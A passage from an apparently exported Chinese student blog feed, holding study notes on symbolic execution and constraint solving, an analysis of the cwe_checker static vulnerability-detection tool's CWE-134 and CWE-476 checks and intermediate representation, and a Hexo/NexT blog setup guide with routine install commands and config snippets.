<li>来看一段示例 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if1: a1 &gt;= 0</span><br><span class="line">if2: a1+2*a2 &gt;= 0</span><br><span class="line">if3: a3&gt;= 0</span><br></pre></td></tr></table></figure></li>
<li>假设上述三个分支中选择了if1:true if2:true
if3:false，pc表示为<code>pc = (a1 &gt;= 0 &amp;&amp; a1+2*a2 &gt;= 0 &amp;&amp; ~(a3 &gt;= 0))</code>，由此可见，pc是一个bool表达式</li>
</ol></li>
<li>符号执行引擎
<ul>
<li>当符号执行到 if(q) 时，pc 有可能包含q（1），也可能包含
~q（2），如果符号执行引擎选择进入then分支，则 pc
表现为（1）的形式，如果符号执行引擎选择进入else分支， 则 pc
表现为（2）的形式</li>
<li>而我们希望两条分支都被测试，所以符号执行引擎执行到if条件语句时，符号执行需要创建两个“并行”的执行过程</li>
<li>每个和符号变量相关的if条件语句都会为pc贡献一个决定程序执行走向的表达式，最后要确定pc对应路径的程序输入参数，只需要用约束求解器对pc进行求解</li>
</ul></li>
</ul></li>
<li><p><strong>符号执行树</strong></p>
<ol type="1">
<li>定义：用来描述程序执行路径的树形结构</li>
<li>内容：一个节点对应程序中的一条语句，还可以包含指令计数、PC、变量值等程序执行状态信息(没找到合适的图，就先放一张不带C代码的)
<img
src="https://img-blog.csdnimg.cn/792e3c5258b74c3bb8a021f3d7d5f1fc.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5qix5bKb44Gu6bK4,size_20,color_FFFFFF,t_70,g_se,x_16" /></li>
</ol></li>
<li><p><strong>约束求解</strong></p>
<ol type="1">
<li>定义：
<ol type="1">
<li>给定一个三元组&lt;V,D,C&gt;,其中：
<ol type="1">
<li>V: 变量的有限集合<br />
</li>
<li>D: 变量的论域，变量可能取值的有限集合<br />
</li>
<li>C: 有限约束集合，某个约束关系<span
class="math inline">\(C_i\)</span>包含V中一个或多个变量，若<span
class="math inline">\(C_i\)</span>包含k个变量，则称其为在这k个变量集合上的k元约束<br />
</li>
</ol></li>
<li>约束求解就是找到约束问题的一个解，该解对变量集合中所有变量都赋一个取自其论域的值，并且这些变量的值满足该问题的所有约束条件<br />
</li>
<li>对于约束问题<span class="math inline">\(P =
&lt;V,D,C&gt;\)</span>，若P至少存在一个解，则称P为可满足的，否则称其为不可满足的<br />
</li>
</ol></li>
<li>分类:
<ol type="1">
<li>SAT(The Satisfiability problem, 可满足性问题)
<ol type="1">
<li>定义：求解由<strong>布尔变量集合</strong>所构成的布尔函数，是否存在变量的一种分布使得该函数的取值为1<br />
</li>
<li>缺陷：①只能解决命题逻辑公式问题，很多实际问题转化不成命题逻辑问题②必须用布尔变量来表示，将实际问题转化为布尔函数开销大，转换后的函数也极其复杂<br />
</li>
</ol></li>
<li>SMT(Satisfiability Modulo Theories, 可满足性模理论)
<ol type="1">
<li>定义：将SAT只能求解命题逻辑公式问题扩展为可以解决一阶逻辑所表达的公式。包含多种理论。
<ol type="1">
<li>什么是一阶逻辑</li>
</ol></li>
</ol></li>
</ol></li>
</ol></li>
<li><p><strong>回到开始的函数</strong></p></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  void sum(a,b)&#123;</span><br><span class="line">2    int x = a;</span><br><span class="line">3    int y = b;</span><br><span class="line">4    int z = x + y;</span><br><span class="line">5    return z;</span><br><span class="line">6  &#125;</span><br></pre></td></tr></table></figure>
<p>我们将其写为<em>类PL/1语言</em> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1  SUM: PROCEDURE(A,B);</span><br><span class="line">2    X&lt;-A;</span><br><span class="line">3    Y&lt;-B;</span><br><span class="line">4    Z&lt;-X+Y;</span><br><span class="line">5    RETURN(Z);</span><br><span class="line">6  END;</span><br></pre></td></tr></table></figure></p>
<p>我们在调用<span
class="math inline">\(sum(1,2)\)</span>后，可以列一个表格来观察程序流<br />
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    2 &amp; 1 &amp; ? &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    3 &amp; 1 &amp; 2 &amp; ? &amp; 1 &amp; 2 &amp; true \cr \hline
    4 &amp; 1 &amp; 2 &amp; 3 &amp; 1 &amp; 2 &amp; true \cr \hline
\end{array}
\]</span> &gt; Line 5是return 3 (Katex不支持合并单元格，理解万岁)</p>
<p>我们在调用<span
class="math inline">\(sum(a1,a2)\)</span>后，就是把具体值换成了对应的符号
<span class="math display">\[
\def\arraystretch{.7}
   \begin{array}{|c|c|c|c|c|c|c|}
   \hline
    Line &amp; X &amp; Y &amp; Z &amp; A &amp; B &amp; pc \cr \hline
    1 &amp; ? &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    2 &amp; a1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    3 &amp; a1 &amp; a2 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
    4 &amp; a1 &amp; a2 &amp; a3 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<blockquote>
<p>Line 5是return (a1+a2)</p>
</blockquote>
<p>既然符号执行与具体值执行最大的区别是if条件语句，那么我们写一个带有if语句的程序来看一下
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 1: POWER: PROCEDURE(X, Y);</span><br><span class="line"> 2:     Z = 1;</span><br><span class="line"> 3:     J = 1;</span><br><span class="line"> 4:</span><br><span class="line"> 5: LAB: IF Y &gt;= J THEN</span><br><span class="line"> 6:         DO;</span><br><span class="line"> 7:             Z = Z * X;</span><br><span class="line"> 8:             J = J + 1;</span><br><span class="line"> 9:             GO TO LAB;</span><br><span class="line">10:         END;</span><br><span class="line">11:</span><br><span class="line">12:     RETURN(Z);</span><br><span class="line">13: END POWER;</span><br></pre></td></tr></table></figure></p>
<p>这个函数转化为C++就是</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int power(int X, int Y) &#123;</span><br><span class="line">    int Z = 1;</span><br><span class="line">    int J = 1;</span><br><span class="line">    while (Y &gt;= J) &#123;</span><br><span class="line">        Z *= X;</span><br><span class="line">        J++;</span><br><span class="line">    &#125;</span><br><span class="line">    return Z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们继续用表格的格式来看</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        1 &amp; ? &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        2 &amp; 1 &amp; ? &amp; a1 &amp; a2 &amp; true \cr \hline
        3 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; true \cr \hline
\end{array}
\]</span></p>
<p>前三行都很正常，直到第五行进行判断<br />
1. 处理判断语句 <code>Y&gt;=J</code> 得到约束条件 <code>a2&gt;=1</code>
2. 生成两个分支的路径约束条件：<br />
- (a2&gt;=1) <span class="math inline">\(\subset\)</span> true -
~(a2&gt;=1) <span class="math inline">\(\subset\)</span> true 3.
两个路径约束都可满足，分别对两个路径进行探索</p>
<p>对于分支: ~(a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; ~(a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后马上在Line 12处得到(return 1 when a2&lt;1)，探索完成</p>
<p>对于分支: (a2&gt;=1) <span class="math inline">\(\subset\)</span>
true</p>
<p><span class="math display">\[
\def\arraystretch{.6}
   \begin{array}{|c|c|c|c|c|c|}
   \hline
        Line &amp; Z &amp; J &amp; X &amp; Y &amp; pc \cr \hline
        5 &amp; 1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        7 &amp; a1 &amp; 1 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
        8 &amp; a1 &amp; 2 &amp; a1 &amp; a2 &amp; (a2&gt;=1) \cr \hline
\end{array}
\]</span></p>
<p>然后因为Line
9，程序会跳回第四行继续判断语句，会产生两个新的分支，就陷入了无限循环，这不是我们想要的。</p>
<p>可是循环在一个程序中经常出现，该怎么解决这一问题？我们接着往后看</p>
<h1 id="x01-动态符号执行技术dse">0x01 动态符号执行技术(DSE)</h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>以具体的数值作为输入，执行程序代码，在程序实际执行路径的基础上：
<ol type="1">
<li>用符号执行技术对路径进行分析</li>
<li>提取路径的约束表达式</li>
<li>根据路径搜索策略(深度、广度)对约束表达式进行变形</li>
<li>求解变形后的表达式并生成新的测试用例</li>
<li>不断迭代上述过程，直到完全遍历程序的所有执行路径</li>
</ol></li>
<li>DSE的出现是为了解决静态SE①执行效率低②系统开销大③误报率高的问题</li>
</ol></li>
<li><strong>实现细节(以函数为例)</strong>
<ol type="1">
<li>场景：<code>void func(int a,int b)</code>,调用<code>func(X,Y)</code></li>
<li>Step1: 生成一组随机输入，开始"实际执行"</li>
<li>Step2:
<strong>同时</strong>符号引擎开始符号执行，按照“实际执行”的“执行路径”上的分支条件语句的“谓词”，搜集所有符号约束条件及其对应真值</li>
<li>Step3:
根据收集到的符号约束条件，按照一定路径选择策略，构造出一条新的可行路径约束
<ul>
<li>举个例子：深度优先策略</li>
<li>如果<code>pc = p1 ∩ p2 ∩ p3</code>,
深度优先就是将最后一个谓词(对不起jo太郎😭离散没学好忘了这个p3叫啥了)取非，变为<code>p1 ∩ p2 ∩ ~p3</code></li>
</ul></li>
<li>Step4: 使用约束求解器求解出新约束集合对应的具体输入</li>
<li>Step5: 重复上述过程，直到遍历全部路径</li>
</ol></li>
<li><strong>DSE工具SAGE</strong>
<ol type="1">
<li>原理粗略地过了一遍，大段大段的看不懂😭这里就不花时间总结了</li>
<li>SAGE基于x86的机器码进行符号执行，原因如下：
<ol type="1">
<li>屏蔽不同编程语言、编译器及编译平台对分析过程的影响，具有更强的复用性</li>
<li>忽略编译器"代码优化""代码混淆""基本块转换"等使代码语义发生变化的操作，有利于确定程序实际存在的漏洞</li>
<li>闭源分析yyds</li>
</ol></li>
</ol></li>
<li><strong>关键问题</strong>
<ol type="1">
<li>外部函数调用</li>
<li>循环问题：路径爆炸</li>
</ol></li>
</ul>
<blockquote>
<p>这一段也不仔细读了...用到再学</p>
</blockquote>
<h1 id="x02-并行符号执行技术pse">0x02
<strong>并行符号执行技术(PSE)</strong></h1>
<ul>
<li><strong>基本思想</strong>
<ol type="1">
<li>很多情况下符号执行引擎无法继续运行的原因是内存不足，所以我们希望通过计算集群可无穷扩展的内存空间和CPU来缓解路径爆炸问题</li>
<li>分布式...这我就先不看了</li>
</ol></li>
</ul>
<h1 id="x03-参考文献">0x03 参考文献</h1>
<p>1《软件安全分析与应用》</p>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>SymbolicExecution</tag>
      </tags>
  </entry>
  <entry>
    <title>cwe_checker Learning Note</title>
    <url>/2024/01/25/cwe_checker%20Learning%20Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
cwe_checker分析存档
</blockquote>
<span id="more"></span>
<blockquote>
<p>在下文中，cwe_checker 将被简写为 cwch</p>
</blockquote>
<h2 id="todo">TODO</h2>
<ol type="1">
<li><p>Read comments</p></li>
<li><p>CWE-476 进一步分析</p></li>
<li><p>cwe_checker中的污点分析，以及多线程的细节</p></li>
<li><p>调试 rust</p></li>
</ol>
<h2 id="issues">Issues</h2>
<ol type="1">
<li><p>AnalysisResults 中的 binary
是二进制文件整体吗，怎么那么大</p></li>
<li><p>cwe-476.rs的cwe_check中，Line96-99（附近）为什么 Node 一定会是
Node::BlkStart？</p></li>
<li><p>cwch 所用的 不动点算法是什么？用来干什么的？</p></li>
</ol>
<h2 id="manual">Manual</h2>
<ol type="1">
<li><p>ghidra自带的html手册：/usr/share/doc/ghidra/</p></li>
<li><p>ghidra-API：<a
href="https://ghidra.re/ghidra_docs/api/ghidra/program/model/pcode/PcodeSyntaxTree.html#getBasicBlocks()">PcodeSyntaxTree
(ghidra.re)</a></p></li>
<li><p>Rust-crate: <a href="https://docs.rs/">Docs.rs</a></p></li>
</ol>
<h2 id="可能有用的pages">可能有用的Pages</h2>
<ol type="1">
<li><p><a
href="https://blog.creativecc.cn/posts/ghidra-pcode.html">Ghidra
Pcode详解 | JackHCC (creativecc.cn)</a></p></li>
<li><p><a href="https://brubbish.github.io/23546.html">CWE_Checker笔记 |
Brubbish's
Notebook</a>（很有用，没思路就去看看这个，这里面还套了很多related pages
&amp; issues）</p></li>
<li><p>https://github.com/fkie-cad/cwe_checker/issues?q=is%3Aopen+is%3Aissue</p></li>
</ol>
<h2 id="cwe_check类的分析">CWE_check类的分析</h2>
<h3 id="cwe-134-use-of-externally-controlled-format-string.">CWE-134:
Use of Externally-Controlled Format String.</h3>
<blockquote>
<p>总体逻辑：</p>
</blockquote>
<p>接受两个参数analysis_result, cwe_params，</p>
<p>→ 从 config.json 中获取对应的 external function symbol，</p>
<p>→ 获取 external function 的信息，</p>
<p>→ 接着获取 pointer inference 分析的结果result。</p>
<p>然后，对于 result 中的每条边，如果这条边是 ExternCallStub
，则进行下一步判断；</p>
<p>→ 如果这条边是个 Call 类型的 Jmp，则进行下一步判断；</p>
<p>→ 如果这条边的“目标节点”在format_string_symbols 中，则去定位这个
external function 的参数args存储的位置。</p>
<p>最后，如果第一个参数位于 GlobalWriteable 或 NonGlobal 区域，则判断为
cwe-134</p>
<h3 id="cwe-476-null-pointer-dereference">cwe-476: NULL Pointer
Dereference</h3>
<blockquote>
<p>总体逻辑：</p>
</blockquote>
<p>接收两个参数，并生成 project，pointer_inference_result
等所需元素，同时开启另外一个线程（记为 subthread ）用于对接子线程的
IO。</p>
<p>→
对于一条“调用外部函数并且目标term在config.json中”的边，我们获取这条边的终点，和以这条边终点的为起始点的
Sub</p>
<p>→ 接着，我们将这条跳转指令和跳转后面的子进程传入“污染源设置函数”</p>
<p>→ 然后，我们在 subthread 中进行一系列不动点分析，并通过
crossbeam_channel 的 cwe_receiver ，将 cwe_warnings
传回主线程.（这一部分有点模糊，还没搞懂）</p>
<blockquote>
<p>作者解释: This is a classical taint analysis. We taint the return
values of functions that may return Null instead of a pointer (e.g.
malloc). Then we follow the data flow of the tainted values until we
either find a conditional jump where the condition checks a tainted
value for being zero (which means no bug) or until the program tries to
access memory through a tainted value (which may be a Null dereference,
since the program did not check whether the tainted value is Null or
not).</p>
</blockquote>
<blockquote>
<p>The real data flow magic (that happens via a fixpoint computation on
the control flow graph) all happens in the
computation.compute_with_max_steps(100); call.</p>
</blockquote>
<p>i.e.
追踪的是“可能是空指针的函数返回值”，并通过污点分析追踪这个返回值是否被用来访问内存，如果被访问，则触发
cwe-476 warning.</p>
<h2 id="intermediate_representation-分析">Intermediate_representation
分析</h2>
<h3 id="edge控制流图中的边">Ⅰ. Edge（控制流图中的边）</h3>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Block</span>: 基本块之间的 edge</span><br><span class="line"></span><br><span class="line"><span class="title class_">Jump</span>: jmp 指令后的 edge</span><br><span class="line"></span><br><span class="line"><span class="title class_">Call</span>: call 指令后和返回的 edge</span><br><span class="line"></span><br><span class="line"><span class="title class_">ExternCallStub</span>: 调用外部函数的 edge</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下列属性没太研究明白</span></span><br><span class="line"><span class="title class_">CrCallStub</span>: </span><br><span class="line"></span><br><span class="line"><span class="title class_">CrReturnStub</span>: </span><br><span class="line"></span><br><span class="line"><span class="title class_">CallCombine</span>: </span><br><span class="line"></span><br><span class="line"><span class="title class_">RetureCombine</span>: </span><br></pre></td></tr></table></figure>
<h3 id="jmp跳转指令包含目标地址条件语句等信息">Ⅱ.
Jmp（跳转指令，包含目标地址、条件语句等信息）</h3>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Branch</span>: 直接跳到目标blk</span><br><span class="line"></span><br><span class="line"><span class="title class_">Branchlnd</span>: 跳转到 <span class="title class_">Expression</span> 计算得出的地址</span><br><span class="line"></span><br><span class="line"><span class="title class_">CBranch</span>: 有条件跳转，当 <span class="title class_">Expression</span> 为真时跳转到目标blk</span><br><span class="line"></span><br><span class="line"><span class="title class_">Call</span>: 直接函数调用</span><br><span class="line"></span><br><span class="line"><span class="title class_">Calllnd</span>: 调用 <span class="title class_">Expression</span> 计算的函数?</span><br><span class="line"></span><br><span class="line"><span class="title class_">Return</span>: 表示从子例程返回，通过给定表达式指定返回值(没懂)</span><br><span class="line"></span><br><span class="line"><span class="title class_">CallOther</span>: 表示所有无法用其他指令表示或不被反汇编器支持的副作用，例如系统调用和其他中断</span><br></pre></td></tr></table></figure>
<h3 id="subsubroutine包含起始点基本块等信息">Ⅲ.
Sub（subroutine，包含起始点、基本块等信息）</h3>
<figure class="highlight jsx"><table><tr><td class="code"><pre><span class="line"><span class="comment">/// A `Sub` or subroutine represents a function with a given name and a list of basic blocks belonging to it.</span></span><br><span class="line"><span class="comment">///</span></span><br><span class="line"><span class="comment">/// Subroutines are *single-entry*,</span></span><br><span class="line"><span class="comment">/// i.e. calling a subroutine will execute the first block in the list of basic blocks.</span></span><br><span class="line"><span class="comment">/// A subroutine may have multiple exits, which are identified by `Jmp::Return` instructions.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="pseudocode-extracted-from-ghidra-分析">PseudoCode extracted From
Ghidra 分析</h2>
<blockquote>
<p>我没找到这一部分的 manual，但是我打印出 pcode
了(第二天发现下面这一部分已经是被翻译成 cwe_checker_IR 的部分了，pcode
在装进 FIFO pipe
并翻译以后就被清理掉了)，因此提取一些特征并解释，其他内容也可以通过
derive Debug 或者自己实现 Debug 的方式来格式化打印，方便分析.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Project 部分内容	 </span><br><span class="line">Project &#123;</span><br><span class="line">    program: Term &#123;</span><br><span class="line">        tid: Tid &#123;</span><br><span class="line">            id: &quot;prog_00400000&quot;,</span><br><span class="line">            address: &quot;00400000&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">        term: Program &#123;</span><br><span class="line">            subs: [</span><br><span class="line">                Term &#123;</span><br><span class="line">                    tid: Tid &#123;</span><br><span class="line">                        id: &quot;sub_00401000&quot;,</span><br><span class="line">                        address: &quot;00401000&quot;,</span><br><span class="line">                    &#125;,</span><br><span class="line">                    term: Sub &#123;</span><br><span class="line">                        name: &quot;_init&quot;,</span><br><span class="line">                        blocks: [</span><br><span class="line">                            Term &#123;</span><br><span class="line">                                tid: Tid &#123;</span><br><span class="line">                                    id: &quot;blk_00401000&quot;,</span><br><span class="line">                                    address: &quot;00401000&quot;,</span><br><span class="line">                                &#125;,</span><br><span class="line">                                term: Blk &#123;</span><br><span class="line">                                    defs: [],</span><br><span class="line">                                    jmps: [</span><br><span class="line">                                        Term &#123;</span><br><span class="line">                                            tid: Tid &#123;</span><br><span class="line">                                                id: &quot;instr_00401000_1&quot;,</span><br><span class="line">                                                address: &quot;00401000&quot;,</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                            term: Jmp &#123;</span><br><span class="line">                                                mnemonic: BRANCH,</span><br><span class="line">                                                goto: Some(</span><br><span class="line">                                                    Direct(</span><br><span class="line">                                                        Tid &#123;</span><br><span class="line">                                                            id: &quot;blk_00401004&quot;,</span><br><span class="line">                                                            address: &quot;00401004&quot;,</span><br><span class="line">                                                        &#125;,</span><br><span class="line">                                                    ),</span><br><span class="line">                                                ),</span><br><span class="line">                                                call: None,</span><br><span class="line">                                                condition: None,</span><br><span class="line">                                                target_hints: None,</span><br><span class="line">                                            &#125;,</span><br><span class="line">                                        &#125;,</span><br><span class="line">                                    ],</span><br><span class="line">                                &#125;,</span><br><span class="line">                            &#125;,</span><br><span class="line">            ......</span><br><span class="line">            entry_points: [</span><br><span class="line">                Tid &#123;</span><br><span class="line">                    id: &quot;sub_00404060&quot;,</span><br><span class="line">                    address: &quot;00404060&quot;,</span><br><span class="line">                &#125;,</span><br><span class="line">                Tid &#123;</span><br><span class="line">                    id: &quot;sub_00404070&quot;,</span><br><span class="line">                    address: &quot;00404070&quot;,</span><br><span class="line">                &#125;,</span><br><span class="line">                Tid &#123;</span><br><span class="line">                    id: &quot;sub_00404080&quot;,</span><br><span class="line">                    address: &quot;00404080&quot;,</span><br><span class="line">                &#125;,</span><br><span class="line">            ],</span><br><span class="line">            image_base: &quot;00400000&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">cpu_architecture 全部内容</span><br><span class="line">cpu_architecture: &quot;x86_64&quot;,</span><br><span class="line"></span><br><span class="line">stack_pointer_register 全部内容</span><br><span class="line">stack_pointer_register: Variable &#123;</span><br><span class="line">        name: Some(</span><br><span class="line">            &quot;RSP&quot;,</span><br><span class="line">        ),</span><br><span class="line">        value: None,</span><br><span class="line">        address: None,</span><br><span class="line">        size: ByteSize(</span><br><span class="line">            8,</span><br><span class="line">        ),</span><br><span class="line">        is_virtual: false,</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">register_properties 部分内容</span><br><span class="line">register_properties: [</span><br><span class="line">        RegisterProperties &#123;</span><br><span class="line">            register: &quot;RAX&quot;,</span><br><span class="line">            base_register: &quot;RAX&quot;,</span><br><span class="line">            lsb: ByteSize(</span><br><span class="line">                0,</span><br><span class="line">            ),</span><br><span class="line">            size: ByteSize(</span><br><span class="line">                8,</span><br><span class="line">            ),</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">CallingConvention 部分内容</span><br><span class="line">CallingConvention &#123;</span><br><span class="line">            name: &quot;syscall&quot;,</span><br><span class="line">            integer_parameter_register: [</span><br><span class="line">                &quot;RDI&quot;,</span><br><span class="line">                &quot;RSI&quot;,</span><br><span class="line">                &quot;RDX&quot;,</span><br><span class="line">                &quot;R10&quot;,</span><br><span class="line">                &quot;R8&quot;,</span><br><span class="line">                &quot;R9&quot;,</span><br><span class="line">            ],</span><br><span class="line">            float_parameter_register: [],</span><br><span class="line">            return_register: [</span><br><span class="line">                &quot;RAX&quot;,</span><br><span class="line">            ],</span><br><span class="line">            float_return_register: [],</span><br><span class="line">            unaffected_register: [</span><br><span class="line">                &quot;RBX&quot;,</span><br><span class="line">                &quot;RDX&quot;,</span><br><span class="line">                &quot;RBP&quot;,</span><br><span class="line">                &quot;RDI&quot;,</span><br><span class="line">                &quot;RSI&quot;,</span><br><span class="line">                &quot;RSP&quot;,</span><br><span class="line">                &quot;R8&quot;,</span><br><span class="line">                &quot;R9&quot;,</span><br><span class="line">                &quot;R10&quot;,</span><br><span class="line">                &quot;R12&quot;,</span><br><span class="line">                &quot;R13&quot;,</span><br><span class="line">                &quot;R14&quot;,</span><br><span class="line">                &quot;R15&quot;,</span><br><span class="line">                &quot;DF&quot;,</span><br><span class="line">            ],</span><br><span class="line">            killed_by_call_register: [</span><br><span class="line">                &quot;RCX&quot;,</span><br><span class="line">                &quot;R11&quot;,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line"></span><br><span class="line">datatype_properties 全部内容</span><br><span class="line">datatype_properties: DatatypeProperties &#123;</span><br><span class="line">        char_size: ByteSize(</span><br><span class="line">            1,</span><br><span class="line">        ),</span><br><span class="line">        double_size: ByteSize(</span><br><span class="line">            8,</span><br><span class="line">        ),</span><br><span class="line">        float_size: ByteSize(</span><br><span class="line">            4,</span><br><span class="line">        ),</span><br><span class="line">        integer_size: ByteSize(</span><br><span class="line">            4,</span><br><span class="line">        ),</span><br><span class="line">        long_double_size: ByteSize(</span><br><span class="line">            10,</span><br><span class="line">        ),</span><br><span class="line">        long_long_size: ByteSize(</span><br><span class="line">            8,</span><br><span class="line">        ),</span><br><span class="line">        long_size: ByteSize(</span><br><span class="line">            8,</span><br><span class="line">        ),</span><br><span class="line">        pointer_size: ByteSize(</span><br><span class="line">            8,</span><br><span class="line">        ),</span><br><span class="line">        short_size: ByteSize(</span><br><span class="line">            2,</span><br><span class="line">        ),</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Software analysis technology</category>
      </categories>
      <tags>
        <tag>auto_tools</tag>
        <tag>taint analysis</tag>
      </tags>
  </entry>
  <entry>
    <title>Hexo &amp; Next 博客配置与美化</title>
    <url>/2023/01/10/blog%20configuration%20&amp;%20beautify/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
鉴于我自己的创作欲，准备正式地经营我的博客XD
</blockquote>
<span id="more"></span>
<h1 id="xf-categories">0xF categories</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">categories: &#123;</span><br><span class="line">  - Geek tech: 安全弱相关技术</span><br><span class="line">  - Software analysis technology: 软件分析技术</span><br><span class="line">  - CTF_practice：CTF 比赛wp及日常题目</span><br><span class="line">  - CTF_Theory: CTF 中的理论知识</span><br><span class="line">  - IOT: 物联网相关技术</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="x0-说在前面">0x0 说在前面:</h1>
<blockquote>
<p>环境：Win11 参考资料：CodeSheep师傅在b站上的视频 &amp;
Next官方文档</p>
</blockquote>
<blockquote>
<p>在配置的过程中经常忘记自己配了什么，导致这篇博客可能不是很全，后续换电脑重配环境时再补充XD</p>
</blockquote>
<h1 id="x1-hexo初始化一个博客">0x1 Hexo初始化一个博客</h1>
<p>首先，我们需要在<a
href="https://nodejs.org/en/">Node.js官网</a>中下载nodejs</p>
<p>其次，在终端输入<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code>
&gt;👆这一步其实可有可无，只不过换到淘宝镜像源以后cnpm的安装速度更快一些</p>
<p>输入<code>cnpm -install -g hexo-cli</code>安装hexo框架，这样hexo就安装好啦XD</p>
<hr />
<p>建立一个空文件夹，并在命令行按序输入<code>hexo init</code>,这样本地的博客就搭建好啦XD</p>
<p>打开自己的Github，创建一个新仓库，名字为<code>个人名称.github.io</code></p>
<p>在终端输入<code>cnpm install --save hexo-deployer-git</code>安装部署器</p>
<p>打开<strong><em>站点配置文件</em></strong>，修改Deployment下的配置
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo:https://github.com/GithubName/GithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure></p>
<p>继续在空文件夹打开终端，输入<code>hexo g</code>和<code>hexo d</code>博客就能部署到远端啦XD</p>
<blockquote>
<p>这里我之前是配置过账户和密码的，所以没有弹出配置的问题，当时也是稀里糊涂就弄好了，导致现在不太清楚到底发生了什么，就没办法复盘，等后面换新电脑再说吧XD</p>
</blockquote>
<h1 id="x2-hexo-config-theme-config">0x2 Hexo config &amp; Theme
config</h1>
<p>我使用的这一个主题👇，这里具体讲讲博客的配置 <a
href="http://theme-next.iissnan.com/">NexT 使用文档 (iissnan.com)</a>
为了描述方便，在以下说明中： 将<strong><em>hexo
init生成的config文件</em></strong>称为<code>站点配置文件</code>
将<strong><em>theme的config文件</em></strong>称为<code>主题配置文件</code></p>
<hr />
<ul>
<li>配置主题 在hexo站点目录中用终端输入👇 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/iissnan/hexo-theme-next themes/next</span><br></pre></td></tr></table></figure>
打开<strong><em>站点配置文件</em></strong>，修改: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">theme: next</span><br></pre></td></tr></table></figure></li>
<li>个人偏好-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Schemes</span><br><span class="line">scheme: Muse</span><br><span class="line"># scheme: Mist</span><br><span class="line"># scheme: Pisces</span><br><span class="line"># scheme: Gemini</span><br></pre></td></tr></table></figure></li>
<li>站点图像-<strong><em>主题配置文件</em></strong>
修改之前记得在themes\next，图像尺寸要符合16x16和32x32 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">favicon:</span><br><span class="line">  small: /images/favicon-16x16.png</span><br><span class="line">  medium: /images/favicon-32x32.png</span><br><span class="line">  apple_touch_icon: /images/apple-touch-icon-next.png</span><br><span class="line">  safari_pinned_tab: /images/logo.svg</span><br><span class="line">  #android_manifest: /images/manifest.json</span><br><span class="line">  #ms_browserconfig: /images/browserconfig.xml</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>社交链接-<strong><em>主题配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Social Links</span><br><span class="line"># Usage: `Key: permalink || icon`</span><br><span class="line"># Key is the link label showing to end users.</span><br><span class="line"># Value before `||` delimiter is the target permalink, value after `||` delimiter is the name of Font Awesome icon.</span><br><span class="line">social:</span><br><span class="line">  GitHub: https://github.com/HeyGap || fab fa-github</span><br></pre></td></tr></table></figure></li>
</ul>
<hr />
<ul>
<li>搜索:先在站点目录下安装<code>npm install hexo-generator-searchdb --save</code></li>
</ul>
<p><strong><em>站点配置文件</em></strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">local_search:</span><br><span class="line">  enable: true</span><br></pre></td></tr></table></figure>
